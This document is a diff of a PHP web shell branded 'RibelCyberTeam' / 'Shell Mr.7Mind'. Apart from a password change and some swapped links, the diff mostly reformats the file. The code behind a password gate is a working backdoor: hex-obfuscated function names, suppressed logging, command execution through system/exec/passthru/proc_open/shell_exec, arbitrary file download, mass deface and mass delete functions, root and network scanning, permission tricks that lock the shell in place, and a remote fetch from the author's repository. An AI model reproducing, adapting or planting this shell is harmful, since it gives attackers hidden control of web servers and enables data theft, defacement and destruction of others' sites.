@@ -1,4 +1,8 @@
-<?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
+<?php 
+header("X-XSS-Protection: 0");
+ob_start();set_time_limit(0);
+error_reporting(0);
+ini_set('display_errors', FALSE);
 $Array = [
 
 // $GLOBALS['fungsi'][0]
@@ -11,52 +15,52 @@ $Array = [
 	'6261736536345F656E636F6465', // b a s e 6 4 _ d e c o d e => 6
 	'676574637764' // g e t c w d => 7
 ];
-$hitung_array = count($Array);
-for ($i = 0; $i < $hitung_array; $i++) {
-    $fungsi[] = unhex($Array[$i]);
-}
-error_reporting(0);
-@clearstatcache();
-@mb_internal_encoding('UTF-8');
-set_time_limit(0);
-@ini_set('error_log',null);
-@ini_set('log_errors',0);
-@ini_set('max_execution_time',0);
-@ini_set('output_buffering',0);
-@ini_set('display_errors', 0);
-@ini_set('disable_functions', 0);
-session_start();
-date_default_timezone_set("Asia/Jakarta");
-$_7 = array_merge($_POST, $_GET);
-$_r = "required='required'";
-$gcw = "getcwd";
-$correctPassword = "heker"; //Change Passwords
-if (isset($_POST['pass'])) {
-    $enteredPassword = $_POST['pass'];
+	$hitung_array = count($Array);
+	for ($i = 0; $i < $hitung_array; $i++) {
+		$fungsi[] = unhex($Array[$i]);
+	}
+	error_reporting(0);
+	@clearstatcache();
+	@mb_internal_encoding('UTF-8');
+	set_time_limit(0);
+	@ini_set('error_log',null);
+	@ini_set('log_errors',0);
+	@ini_set('max_execution_time',0);
+	@ini_set('output_buffering',0);
+	@ini_set('display_errors', 0);
+	@ini_set('disable_functions', 0);
+	session_start();
+	date_default_timezone_set("Asia/Jakarta");
+	$_7 = array_merge($_POST, $_GET);
+	$_r = "required='required'";
+	$gcw = "getcwd";
+	$correctPassword = "ayu"; //Change Password
+	if (isset($_POST['pass'])) {
+		$enteredPassword = $_POST['pass'];
 
-    if ($enteredPassword === $correctPassword) {
-        $_SESSION['forbidden'] = true;
-    } else {
-        echo '<script>alert("Password Wrong!, Try Again.");</script>';
-    }
-}
-if (isset($_GET['logout'])) {
-    session_unset();
-    session_destroy();
-    header("Location: ".$_SERVER['PHP_SELF']);
-    exit();
-}
-if (!isset($_SESSION['forbidden'])) {
-?>
-<!DOCTYPE html>
-<html>
-<head>
-<title>-=[ RibelCyberTeam ]=-</title>
-<link rel='icon' href='https://id.rakko.tools/image/icon_gold.png'>
-<meta name="theme color" content="#00BFFF">
-<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
-</head>
-<style>
+		if ($enteredPassword === $correctPassword) {
+			$_SESSION['forbidden'] = true;
+		} else {
+			echo '<script>alert("Password Wrong!, Try Again.");</script>';
+		}
+	}
+	if (isset($_GET['logout'])) {
+		session_unset();
+		session_destroy();
+		header("Location: ".$_SERVER['PHP_SELF']);
+		exit();
+	}
+	if (!isset($_SESSION['forbidden'])) {
+	?>
+	<!DOCTYPE html>
+	<html>
+	<head>
+	<title>-=[ RibelCyberTeam ]=-</title>
+	<link rel='icon' href='https://raw.githubusercontent.com/Mr-7Mind/BahanShell/main/hehe.png'>
+	<meta name="theme color" content="#00BFFF">
+	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
+	</head>
+	<style>
     body {
         background-image: url("https://i.pinimg.com/originals/7c/de/2e/7cde2ea6c641527af6ace384e42c89e6.gif");
         background-repeat: no-repeat;
@@ -97,192 +101,232 @@ if (!isset($_SESSION['forbidden'])) {
         padding: 5px 10px;
         cursor: pointer;
     }
-</style>
-<body>
-<form method="post">
-        <input placeholder="password" type="password" name="pass" required>
-        <input type="submit" name="watching" value="GO IN!">
-    </form>
-</body>
-</html>
-<?php
-exit;
-}
-?>
-<?php
-echo file_get_contents("https://raw.githubusercontent.com/Mr-7Mind/AlertUpdate/main/184index.html"); // Alert for update
-?>
-<?php
-if(isset($_7["left"])) {
-	session_start();
-	session_destroy();
-	echo '<script>window.location="'.$_SERVER['PHP_SELF'].'";</script>';
-}
-if(isset($_7['opn']) && ($_7['opn'] != '') && ($_7['action'] == 'download')){
-	@ob_clean();
-	$file = $_7['opn'];
-	header('Content-Description: File Transfer');
-	header('Content-Type: application/octet-stream');
-	header('Content-Disposition: attachment; filename="'.basename($file).'"');
-	header('Expires: 0');
-	header('Cache-Control: must-revalidate');
-	header('Pragma: public');
-	header('Content-Length: ' . filesize($file));
-	readfile($file);
+	</style>
+	<body>
+	<form method="post">
+			<input placeholder="password" type="password" name="pass" required>
+			<input type="submit" name="watching" value="GO IN!">
+		</form>
+	</body>
+	</html>
+	<?php
 	exit;
-}
-function w($dir,$perm) {
-	if(!is_writable($dir)) {
-		return "<rd>".$perm."</rd>";
+	}
+	?>
+	<?php
+	echo file_get_contents("https://raw.githubusercontent.com/Mr-7Mind/AlertUpdate/main/184index.html"); // Alert for update
+	?>
+	<?php
+	if(isset($_7["left"])) {
+		session_start();
+		session_destroy();
+		echo '<script>window.location="'.$_SERVER['PHP_SELF'].'";</script>';
+	}
+	if(isset($_7['opn']) && ($_7['opn'] != '') && ($_7['action'] == 'download')){
+		@ob_clean();
+		$file = $_7['opn'];
+		header('Content-Description: File Transfer');
+		header('Content-Type: application/octet-stream');
+		header('Content-Disposition: attachment; filename="'.basename($file).'"');
+		header('Expires: 0');
+		header('Cache-Control: must-revalidate');
+		header('Pragma: public');
+		header('Content-Length: ' . filesize($file));
+		readfile($file);
+		exit;
+	}
+	function w($dir,$perm) {
+		if(!is_writable($dir)) {
+			return "<rd>".$perm."</rd>";
+		} else {
+			return "<gr>".$perm."</gr>";
+		}
+	}
+	function s(){
+		echo '<style>table{display:none;}</style><div class="table-responsive"><hr></div>';
+	}
+	function ok(){
+		echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
+	}
+	function er(){
+		echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
+	}
+	function sz($byt){
+		$typ = array('B', 'KB', 'MB', 'GB', 'TB');
+		for($i = 0; $byt >= 1024 && $i < (count($typ) -1 ); $byt /= 1024, $i++ );
+		return(round($byt,2)." ".$typ[$i]);
+	}
+	function ia() {
+		$ia = '';
+	if (getenv('HTTP_CLIENT_IP'))
+		$ia = getenv('HTTP_CLIENT_IP');
+	else if(getenv('HTTP_X_FORWARDED_FOR'))
+		$ia = getenv('HTTP_X_FORWARDED_FOR');
+	else if(getenv('HTTP_X_FORWARDED'))
+		$ia = getenv('HTTP_X_FORWARDED');
+	else if(getenv('HTTP_FORWARDED_FOR'))
+		$ia = getenv('HTTP_FORWARDED_FOR');
+	else if(getenv('HTTP_FORWARDED'))
+		$ia = getenv('HTTP_FORWARDED');
+	else if(getenv('REMOTE_ADDR'))
+		$ia = getenv('REMOTE_ADDR');
+	else
+		$ia = 'Unknown IP.';
+	return $ia;
+	}
+	function exe($cmd) {
+		if ($GLOBALS['fungsi'][5]('system')) {
+			@ob_start();
+			@system($cmd);
+			$buff = @ob_get_contents();
+			@ob_end_clean();
+			return $buff;
+		} elseif ($GLOBALS['fungsi'][5]('exec')) {
+			@exec($cmd, $results);
+			$buff = "";
+			foreach ($results as $result) {
+				$buff .= $result;
+			}
+			return $buff;
+		} elseif ($GLOBALS['fungsi'][5]('passthru')) {
+			@ob_start();
+			@passthru($cmd);
+			$buff = @ob_get_contents();
+			@ob_end_clean();
+			return $buff;
+		} elseif (function_exists('proc_open')) {
+			$pipes = array();
+			$process = @proc_open($cmd . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
+			$buff = @stream_get_contents($pipes[1]);
+			@proc_close($process);
+			return $buff;
+		} elseif ($GLOBALS['fungsi'][5]('shell_exec')) {
+			$buff = @shell_exec($cmd);
+			return $buff;
+		}
+	}
+	function exe_root($set,$sad) {
+		$x = "preg_match";
+		$xx = "2>&1";
+		if (!$x("/".$xx."/i", $set)) {
+			$set = $set." ".$xx;
+		}
+		$a = $GLOBALS['fungsi'][5];
+		$b = "proc_open";
+		$c = "htmlspecialchars";
+		$d = "stream_get_contents";
+		if ($a($b)) {
+			$ps = $b($set, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pink,$sad);
+			return $d($pink[1]);
+		} else {
+			return "proc_open function is disabled !";
+		}
+	}
+	function hex($n)
+	{
+		$y = '';
+		for ($i = 0; $i < strlen($n); $i++) {
+			$y .= dechex(ord($n[$i]));
+		}
+		return $y;
+	}
+	function unhex($y)
+	{
+		$n = '';
+		for ($i = 0; $i < strlen($y) - 1; $i += 2) {
+			$n .= chr(hexdec($y[$i] . $y[$i + 1]));
+		}
+		return $n;
+	}
+	function p($file){
+	$p = fileperms($file);
+	if (($p & 0xC000) == 0xC000) {
+	$i = 's';
+	} elseif (($p & 0xA000) == 0xA000) {
+	$i = 'l';
+	} elseif (($p & 0x8000) == 0x8000) {
+	$i = '-';
+	} elseif (($p & 0x6000) == 0x6000) {
+	$i = 'b';
+	} elseif (($p & 0x4000) == 0x4000) {
+	$i = 'd';
+	} elseif (($p & 0x2000) == 0x2000) {
+	$i = 'c';
+	} elseif (($p & 0x1000) == 0x1000) {
+	$i = 'p';
 	} else {
-		return "<gr>".$perm."</gr>";
+	$i = 'u';
+		}
+	$i .= (($p & 0x0100) ? 'r' : '-');
+	$i .= (($p & 0x0080) ? 'w' : '-');
+	$i .= (($p & 0x0040) ?
+	(($p & 0x0800) ? 's' : 'x' ) :
+	(($p & 0x0800) ? 'S' : '-'));
+	$i .= (($p & 0x0020) ? 'r' : '-');
+	$i .= (($p &0x0010) ? 'w' : '-');
+	$i .= (($p & 0x0008) ?
+	(($p & 0x0400) ? 's' : 'x' ) :
+	(($p & 0x0400) ? 'S' : '-'));
+	$i .= (($p & 0x0004) ? 'r' : '-');
+	$i .= (($p & 0x0002) ? 'w' : '-');
+	$i .= (($p & 0x0001) ?
+	(($p & 0x0200) ? 't' : 'x' ) :
+	(($p & 0x0200) ? 'T' : '-'));
+	return $i;
 	}
-}
-function s(){
-	echo '<style>table{display:none;}</style><div class="table-responsive"><hr></div>';
-}
-function ok(){
-	echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
-}
-function er(){
-	echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
-}
-function sz($byt){
-	$typ = array('B', 'KB', 'MB', 'GB', 'TB');
-	for($i = 0; $byt >= 1024 && $i < (count($typ) -1 ); $byt /= 1024, $i++ );
-	return(round($byt,2)." ".$typ[$i]);
-}
-function ia() {
-	$ia = '';
-if (getenv('HTTP_CLIENT_IP'))
-	$ia = getenv('HTTP_CLIENT_IP');
-else if(getenv('HTTP_X_FORWARDED_FOR'))
-	$ia = getenv('HTTP_X_FORWARDED_FOR');
-else if(getenv('HTTP_X_FORWARDED'))
-	$ia = getenv('HTTP_X_FORWARDED');
-else if(getenv('HTTP_FORWARDED_FOR'))
-	$ia = getenv('HTTP_FORWARDED_FOR');
-else if(getenv('HTTP_FORWARDED'))
-	$ia = getenv('HTTP_FORWARDED');
-else if(getenv('REMOTE_ADDR'))
-	$ia = getenv('REMOTE_ADDR');
-else
-	$ia = 'Unknown IP.';
-return $ia;
-}
-function exe($cmd) {
-if($GLOBALS['fungsi'][5]('system')) {
-	@ob_start();
-	@system($cmd);
-	$buff = @ob_get_contents();
-	@ob_end_clean();
-	return $buff;
-} elseif($GLOBALS['fungsi'][5]('exec')) {
-	@exec($cmd,$results);
-	$buff = "";
-foreach($results as $result) {
-	$buff .= $result;
-	} return $buff;
-} elseif($GLOBALS['fungsi'][5]('passthru')) {
-	@ob_start();
-	@passthru($cmd);
-	$buff = @ob_get_contents();
-	@ob_end_clean();
-	return $buff;
-} elseif($GLOBALS['fungsi'][5]('shell_exec')) {
-	$buff = @shell_exec($cmd);
-	return $buff;
-	}
-}
-function exe_root($set,$sad) {
-	$x = "preg_match";
-	$xx = "2>&1";
-	if (!$x("/".$xx."/i", $set)) {
-		$set = $set." ".$xx;
-	}
-	$a = $GLOBALS['fungsi'][5];
-	$b = "proc_open";
-	$c = "htmlspecialchars";
-	$d = "stream_get_contents";
-	if ($a($b)) {
-		$ps = $b($set, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pink,$sad);
-		return $d($pink[1]);
+	if(isset($_7['dir'])) {
+		$dir = unhex($_7['dir']);
+		chdir($dir);
 	} else {
-		return "proc_open function is disabled !";
+		$dir = hex($gcw());
 	}
-}
-function hex($n)
-{
-    $y = '';
-    for ($i = 0; $i < strlen($n); $i++) {
-        $y .= dechex(ord($n[$i]));
-    }
-    return $y;
-}
-function unhex($y)
-{
-    $n = '';
-    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
-        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
-    }
-    return $n;
-}
-function p($file){
-$p = fileperms($file);
-if (($p & 0xC000) == 0xC000) {
-$i = 's';
-} elseif (($p & 0xA000) == 0xA000) {
-$i = 'l';
-} elseif (($p & 0x8000) == 0x8000) {
-$i = '-';
-} elseif (($p & 0x6000) == 0x6000) {
-$i = 'b';
-} elseif (($p & 0x4000) == 0x4000) {
-$i = 'd';
-} elseif (($p & 0x2000) == 0x2000) {
-$i = 'c';
-} elseif (($p & 0x1000) == 0x1000) {
-$i = 'p';
-} else {
-$i = 'u';
-	}
-$i .= (($p & 0x0100) ? 'r' : '-');
-$i .= (($p & 0x0080) ? 'w' : '-');
-$i .= (($p & 0x0040) ?
-(($p & 0x0800) ? 's' : 'x' ) :
-(($p & 0x0800) ? 'S' : '-'));
-$i .= (($p & 0x0020) ? 'r' : '-');
-$i .= (($p &0x0010) ? 'w' : '-');
-$i .= (($p & 0x0008) ?
-(($p & 0x0400) ? 's' : 'x' ) :
-(($p & 0x0400) ? 'S' : '-'));
-$i .= (($p & 0x0004) ? 'r' : '-');
-$i .= (($p & 0x0002) ? 'w' : '-');
-$i .= (($p & 0x0001) ?
-(($p & 0x0200) ? 't' : 'x' ) :
-(($p & 0x0200) ? 'T' : '-'));
-return $i;
-}
-if(isset($_7['dir'])) {
-	$dir = unhex($_7['dir']);
-	chdir($dir);
-} else {
-	$dir = hex($gcw());
-}
-echo "
-<html>
+	echo "
+	<html>
 	<head>
+		<title>Shell Mr.7Mind</title>
 		<meta charset='UTF-8'>
 		<meta name='author' content='RibelCyberTeam'>
 		<meta name='viewport' content='width=device-width, initial-scale=0.70'>
-		<link rel='stylesheet' href='https://xnxx.co.ws/meki.css'>
 		<link rel='icon' href='https://chat.openai.com/apple-touch-icon.png'>
-		<title>Shell Mr.7Mind</title>
+		<link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css'>
+		<link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css'>
+		<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css'>
+        <link href='https://fonts.googleapis.com/css2?family=Poppins:wght@600&family=Roboto+Slab:wght@600&display=swap' rel='stylesheet'>
 		<script src='https://cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
 		<script src='https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
 		<script src='https://code.jquery.com/jquery-3.3.1.slim.min.js'></script>
-<body class='bg-secondary text-light'>
-<div class='container-fluid'>
+        <style>
+            .text-decoration {
+                font-family: 'Poppins', sans-serif;
+                color: white;
+                text-decoration: none;
+            }
+            .text-secondary {
+                color: #6c757d;
+            }
+            .anu {
+                color: #6c757d;
+            }
+            .corner {
+                position: relative;
+            }
+            .corner .icon {
+                position: absolute;
+                top: 50%;
+                transform: translateY(-50%);
+                margin-left: 10px;
+            }
+        </style>
+        <style>
+            gr {
+                color: green;
+            }
+            rd {
+                color: red;
+            }
+            </style>
+        <body class='bg-secondary text-light'>
+	<div class='container-fluid'>
 	<div class='py-3' id='main'>
 		<div class='box shadow bg-dark p-4 rounded-3'>
 			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>RibelCyberTeam</h4></a>";
@@ -365,115 +409,115 @@ echo "
 				Disable Function:<br><pre>$disfc</pre>
 				</div>
 			</div>
-		</div>
-		<div class='text-center'>
-    <div class='btn-group'>
-        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=upload'><i class='bi bi-upload'></i> Upload</a>
-        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=cmd'><i class='bi bi-terminal'></i> Console</a>
-    </div>
-    <div class='btn-group'>
-        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=deface'><i class='bi bi-exclamation-diamond'></i> Mass deface</a>
-        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=delete'><i class='bi bi-trash'></i> Mass delete</a>
-    </div>
-    <div class='btn-group'>
-        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=scan_root'><i class='bi bi-search'></i> Scan root</a>
-        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=network'><i class='bi bi-hdd-network'></i> Network</a>
-    </div><br><br>
-    <div class='btn-group'>
-        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=lockshell'><i class='bi bi-file-earmark-lock'></i> Lock Shell</a>
-        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=rootshell'><i class='bi bi-file-earmark'></i> 0777 Shell</a>
-    </div>
-    <div class='btn-group'>
-        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=root_file'><i class='bi bi-file-earmark'></i> Green All File</a>
-		<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=root_folders'><i class='bi bi-folder'></i> Green All Folders</a>
-    </div>
-    <div class='btn-group'>
-        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_file'><i class='bi bi-file-earmark-lock'></i> Lock All File</a>
-        <a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_folders'><i class='bi bi-folder'></i> Lock All Folders</a>
-    </div>
-	<div class='btn-group'>
-        <a class='btn btn-outline-light btn-sm' href='?logout=true'><i class='bi bi-box-arrow-in-left'></i> Logout</a>
-    </div>
-</div>";
-if(isset($_7['dir'])) {
-	$dir = unhex($_7['dir']);
-	chdir($dir);
-	} else {
-$dir = hex($gcw());
-}
-$dir = str_replace("\\","/",$dir);
-	$scdir = explode("/", $dir);	
-for($i = 0; $i <= $c_dir; $i++) {
-	$scdir[$i];
-if($i != $c_dir) {
-}
-function changeFilePermissions($filename, $permissions) {
-    if (file_exists($filename)) {
-        if (chmod($filename, $permissions)) {
-            echo "Izin file $filename berhasil diubah menjadi $permissions.";
-        } else {
-            echo "Gagal mengubah izin file $filename.";
-        }
-    } else {
-        echo "File $filename tidak ditemukan.";
-    }
-}
-function changeFolderPermissionsRecursive($dir, $perms) {
-    $iterator = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
-        RecursiveIteratorIterator::SELF_FIRST
-    );
+				</div>
+				<div class='text-center'>
+			<div class='btn-group'>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=upload'><i class='bi bi-upload'></i> Upload</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=cmd'><i class='bi bi-terminal'></i> Console</a>
+			</div>
+			<div class='btn-group'>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=deface'><i class='bi bi-exclamation-diamond'></i> Mass deface</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=delete'><i class='bi bi-trash'></i> Mass delete</a>
+			</div>
+			<div class='btn-group'>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=scan_root'><i class='bi bi-search'></i> Scan root</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=network'><i class='bi bi-hdd-network'></i> Network</a>
+			</div><br><br>
+			<div class='btn-group'>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=lockshell'><i class='bi bi-file-earmark-lock'></i> Lock Shell</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=rootshell'><i class='bi bi-file-earmark'></i> 0777 Shell</a>
+			</div>
+			<div class='btn-group'>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=root_file'><i class='bi bi-file-earmark'></i> Green All File</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=root_folders'><i class='bi bi-folder'></i> Green All Folders</a>
+			</div>
+			<div class='btn-group'>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_file'><i class='bi bi-file-earmark-lock'></i> Lock All File</a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&id=dark_folders'><i class='bi bi-folder'></i> Lock All Folders</a>
+			</div>
+			<div class='btn-group'>
+				<a class='btn btn-outline-light btn-sm' href='?logout=true'><i class='bi bi-box-arrow-in-left'></i> Logout</a>
+			</div>
+		</div>";
+		if(isset($_7['dir'])) {
+			$dir = unhex($_7['dir']);
+			chdir($dir);
+			} else {
+		$dir = hex($gcw());
+		}
+		$dir = str_replace("\\","/",$dir);
+			$scdir = explode("/", $dir);	
+		for($i = 0; $i <= $c_dir; $i++) {
+			$scdir[$i];
+		if($i != $c_dir) {
+		}
+		function changeFilePermissions($filename, $permissions) {
+			if (file_exists($filename)) {
+				if (chmod($filename, $permissions)) {
+					echo "Izin file $filename berhasil diubah menjadi $permissions.";
+				} else {
+					echo "Gagal mengubah izin file $filename.";
+				}
+			} else {
+				echo "File $filename tidak ditemukan.";
+			}
+		}
+		function changeFolderPermissionsRecursive($dir, $perms) {
+			$iterator = new RecursiveIteratorIterator(
+				new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
+				RecursiveIteratorIterator::SELF_FIRST
+			);
 
-    foreach ($iterator as $item) {
-        if ($item->isDir()) {
-            chmod($item->getPathname(), $perms);
-        }
-    }
-}
-function changeFilePermissionsRecursive($dir, $perms) {
-    $iterator = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
-        RecursiveIteratorIterator::SELF_FIRST
-    );
+			foreach ($iterator as $item) {
+				if ($item->isDir()) {
+					chmod($item->getPathname(), $perms);
+				}
+			}
+		}
+		function changeFilePermissionsRecursive($dir, $perms) {
+			$iterator = new RecursiveIteratorIterator(
+				new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
+				RecursiveIteratorIterator::SELF_FIRST
+			);
 
-    foreach ($iterator as $item) {
-        if ($item->isFile()) {
-            chmod($item->getPathname(), $perms);
-        }
-    }
-}
-$currentDirectory = '.';
-if (isset($_GET['id']) && $_GET['id'] === 'root_file') {
-    $newFilePermissions = 0644;
-    changeFilePermissionsRecursive($currentDirectory, $newFilePermissions);
-    echo "Permissions changed for all files in the current directory.";
-}
-if (isset($_GET['id']) && $_GET['id'] === 'root_folders') {
-	$newFolderPermissions = 0755;
-    changeFolderPermissionsRecursive($currentDirectory, $newFolderPermissions);
-    echo "Permissions changed for all folders in the current directory.";
-}
-if (isset($_GET['id']) && $_GET['id'] === 'dark_file') {
-    $newFilePermissions = 0444;
-    changeFilePermissionsRecursive($currentDirectory, $newFilePermissions);
-    echo "Permissions changed for all files in the current directory.";
-}
-if (isset($_GET['id']) && $_GET['id'] === 'dark_folders') {
-    $newFolderPermissions = 0555;
-    changeFolderPermissionsRecursive($currentDirectory, $newFolderPermissions);
-    echo "Permissions changed for all folders in the current directory.";
-}
-$filename = __FILE__;
+			foreach ($iterator as $item) {
+				if ($item->isFile()) {
+					chmod($item->getPathname(), $perms);
+				}
+			}
+		}
+		$currentDirectory = '.';
+		if (isset($_GET['id']) && $_GET['id'] === 'root_file') {
+			$newFilePermissions = 0644;
+			changeFilePermissionsRecursive($currentDirectory, $newFilePermissions);
+			echo "Permissions changed for all files in the current directory.";
+		}
+		if (isset($_GET['id']) && $_GET['id'] === 'root_folders') {
+			$newFolderPermissions = 0755;
+			changeFolderPermissionsRecursive($currentDirectory, $newFolderPermissions);
+			echo "Permissions changed for all folders in the current directory.";
+		}
+		if (isset($_GET['id']) && $_GET['id'] === 'dark_file') {
+			$newFilePermissions = 0444;
+			changeFilePermissionsRecursive($currentDirectory, $newFilePermissions);
+			echo "Permissions changed for all files in the current directory.";
+		}
+		if (isset($_GET['id']) && $_GET['id'] === 'dark_folders') {
+			$newFolderPermissions = 0555;
+			changeFolderPermissionsRecursive($currentDirectory, $newFolderPermissions);
+			echo "Permissions changed for all folders in the current directory.";
+		}
+		$filename = __FILE__;
 
-if (isset($_GET['id']) && $_GET['id'] === 'lockshell') {
-    $newPermissions = 0444;
-    changeFilePermissions($filename, $newPermissions);
-}
-if (isset($_GET['id']) && $_GET['id'] === 'rootshell') {
-    $newPermissions = 0777;
-    changeFilePermissions($filename, $newPermissions);
-}
-$ip = $_SERVER['REMOTE_ADDR'];
+		if (isset($_GET['id']) && $_GET['id'] === 'lockshell') {
+			$newPermissions = 0444;
+			changeFilePermissions($filename, $newPermissions);
+		}
+		if (isset($_GET['id']) && $_GET['id'] === 'rootshell') {
+			$newPermissions = 0777;
+			changeFilePermissions($filename, $newPermissions);
+		}
+		$ip = $_SERVER['REMOTE_ADDR'];
 		$rib = "http://ip-api.com/json/{$ip}?fields=city";
 		$ch = curl_init();
 		curl_setopt($ch, CURLOPT_URL, $rib);
@@ -559,7 +603,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 				<i class='bi bi-file-earmark'></i> Your script:
 				<textarea class='form-control btn-sm' rows='7' name='script' placeholder='your script'></textarea>
 				<div class='d-grid gap-2'>
-					<input class='btn btn-dark btn-sm'type='submit' name='start' value='deface'>
+				<input class='btn btn-dark btn-sm'type='submit' name='start' value='deface'>
 				</div>
 			</form>
 		</div>";
@@ -861,7 +905,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 		<form method='POST'>
 			<textarea class='form-control btn-sm' rows='15' name='contents' $_r>".htmlspecialchars($fungsi[0]($file))."</textarea>
 			<div class='d-grid gap-2'>
-				<button class='btn btn-outline-light btn-sm' type='sumbit' name='edit_file'><i class='bi bi-arrow-return-right'></i></button>
+			<button class='btn btn-outline-light btn-sm' type='sumbit' name='edit_file'><i class='bi bi-arrow-return-right'></i></button>
 			</div>
 		</form>";
 		}
@@ -1104,7 +1148,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 		}
 		echo "
 		<div class='btn-group mb-3'>
-			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=zip_folder'><i class='bi bi-file-zip-fill'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=touch_folder'><i class='bi bi-calendar'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod_folder'><i class='bi bi-file-lock-fill'></i></a>
@@ -1303,7 +1347,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 				<td class="text-center">last edit</td>
 				<td class="text-center">size</td>
 				<td class="text-center">owner<gr>/</gr>group</td>
-				<td class="text-center">permsion</td>
+				<td class="text-center">permision</td>
 			<td class="text-center">action</td>
 		</tr>
 		</thead>
